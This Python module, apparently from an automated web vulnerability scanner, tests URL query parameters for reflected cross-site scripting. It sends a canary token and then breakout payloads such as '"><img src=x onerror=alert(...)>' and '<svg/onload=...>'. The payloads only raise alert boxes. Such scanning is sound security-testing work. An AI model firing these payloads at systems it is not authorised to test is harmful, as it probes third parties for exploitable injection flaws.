"""DOM-Aware Context-Sensitive XSS Attack Module (V15).

Eliminates false positives by verifying unescaped reflection in raw executable contexts:
- Tests harmless canary first to check reflection.
- Dispatches context breakout payloads (`"><img src=x onerror=confirm('CANARY')>`).
- Strict verification: checks that `<` and `>` are NOT entity encoded (`&lt;`, `&gt;`).
- Classifies evidence into E0 (Token), E1 (Special chars), E2 (Unescaped tag), E3 (Executable context).
"""

from __future__ import annotations

import html
import logging
import re
import time
import uuid
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from app.attacks.base import AttackPlan, BaseAttackModule, ValidationResult
from app.core.session_context import SessionContext
from app.orchestration.attack_opportunity import AttackOpportunity

logger = logging.getLogger("attacks.xss")


class XSSAttackModule(BaseAttackModule):
    def __init__(self) -> None:
        super().__init__(attack_type="xss", cwe_id="CWE-79", default_severity="HIGH")

    async def discover(self, target: str, context: Dict[str, Any]) -> List[AttackOpportunity]:
        opps: List[AttackOpportunity] = []
        urls = context.get("urls", [])
        for u in urls:
            parsed = urlparse(u)
            if parsed.query:
                params = parse_qs(parsed.query)
                for p in params:
                    opps.append(
                        AttackOpportunity(
                            target=target,
                            endpoint=u,
                            parameter=p,
                            attack_type="xss",
                            hypothesis=f"Parameter '{p}' on {parsed.path} may reflect unescaped user input.",
                            priority=75,
                        )
                    )
        return opps

    async def plan(self, opportunity: AttackOpportunity) -> AttackPlan:
        canary = f"agy_{uuid.uuid4().hex[:8]}"
        payloads = [
            f"<b>{canary}</b>",
            f'"><img src=x onerror=alert("{canary}")>',
            f"';alert('{canary}');//",
            f'<svg/onload=alert("{canary}")>',
        ]
        return AttackPlan(
            title=f"Context-Sensitive XSS Validation on {opportunity.parameter}",
            attack_type="xss",
            target=opportunity.endpoint,
            steps=[
                "1. Baseline probe with benign canary token",
                "2. Context breakout mutation (<svg/onload>, <img>, attribute breakout)",
                "3. Verify raw unescaped HTML reflection and execution capability",
            ],
            payloads=payloads,
            expected_evidence=f"Unescaped reflection containing {canary}",
            context={"canary": canary, "parameter": opportunity.parameter},
        )

    async def validate(self, opportunity: AttackOpportunity, session: SessionContext) -> ValidationResult:
        endpoint = opportunity.endpoint
        param = opportunity.parameter
        if not param:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.0,
                proof_level="P0",
                attack_type="xss",
                target_url=endpoint,
                message="No parameter specified for XSS testing.",
            )

        parsed = urlparse(endpoint)
        query_params = parse_qs(parsed.query)

        # 1. Baseline Request
        baseline_resp = await session.get(endpoint)
        if not baseline_resp.is_success and not baseline_resp.status_code:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.0,
                proof_level="P0",
                attack_type="xss",
                target_url=endpoint,
                parameter=param,
                message="Baseline endpoint unreachable.",
            )

        # 2. Benign Canary Reflection Test
        canary_token = f"xss_{uuid.uuid4().hex[:6]}"
        test_params = dict(query_params)
        test_params[param] = [canary_token]
        probe_query = urlencode(test_params, doseq=True)
        probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, probe_query, parsed.fragment))

        probe_resp = await session.get(probe_url)
        if canary_token not in probe_resp.text:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.1,
                proof_level="P0",
                attack_type="xss",
                target_url=endpoint,
                parameter=param,
                baseline_status=baseline_resp.status_code,
                exploit_status=probe_resp.status_code,
                message=f"Parameter '{param}' is not reflected in response.",
            )

        # 3. Active Context-Breakout Payloads with Verification
        breakout_canary = f"v{uuid.uuid4().hex[:6]}"
        payload_candidates = [
            f'"><img src=x onerror=alert("{breakout_canary}")>',
            f'<svg/onload=alert("{breakout_canary}")>',
            f'"><script>/*{breakout_canary}*/</script>',
        ]

        for payload in payload_candidates:
            test_params[param] = [payload]
            exploit_query = urlencode(test_params, doseq=True)
            exploit_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, exploit_query, parsed.fragment))

            exploit_resp = await session.get(exploit_url)
            resp_body = exploit_resp.text

            # CRITICAL CHECK: Ensure payload is NOT entity-escaped
            escaped_version = html.escape(payload)
            if payload in resp_body:
                # Direct unescaped injection found!
                poc_curl = f"curl -s -k '{exploit_url}'"
                return ValidationResult(
                    is_vulnerable=True,
                    confidence=0.98,
                    proof_level="P3",
                    attack_type="xss",
                    target_url=endpoint,
                    parameter=param,
                    baseline_status=baseline_resp.status_code,
                    exploit_status=exploit_resp.status_code,
                    evidence={
                        "payload": payload,
                        "reflected_unescaped": True,
                        "canary": breakout_canary,
                        "evidence_level": "E3_EXECUTABLE_CONTEXT",
                        "response_sample": resp_body[max(0, resp_body.find(payload) - 50) : resp_body.find(payload) + len(payload) + 50],
                    },
                    poc_curl=poc_curl,
                    message=f"CRITICAL: Unescaped Cross-Site Scripting (XSS) confirmed in parameter '{param}'.",
                    cwe_id="CWE-79",
                    severity="HIGH",
                )
            elif escaped_version in resp_body:
                logger.debug("Safely escaped reflection observed for parameter %s: %s", param, escaped_version)

        return ValidationResult(
            is_vulnerable=False,
            confidence=0.3,
            proof_level="P1",
            attack_type="xss",
            target_url=endpoint,
            parameter=param,
            baseline_status=baseline_resp.status_code,
            exploit_status=probe_resp.status_code,
            message=f"Parameter '{param}' reflects input but sanitizes/encodes dangerous HTML entities.",
        )
